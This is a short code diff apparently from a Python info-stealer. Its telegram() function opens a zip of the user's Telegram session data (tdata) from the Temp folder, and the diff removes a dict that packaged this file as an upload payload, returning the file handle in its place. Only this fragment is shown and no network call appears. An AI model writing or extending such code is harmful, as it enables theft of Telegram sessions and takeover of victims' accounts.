@@ -15,7 +15,4 @@ def telegram():
     except:
         pass
     with open(user+'\\AppData\\Local\\Temp\\tdata_session.zip', 'rb') as f:
-     payload = {
-        'file': (user+'\\AppData\\Local\\Temp\\tdata_session.zip', f, 'zip')
-     }
-    return payload
+        return f
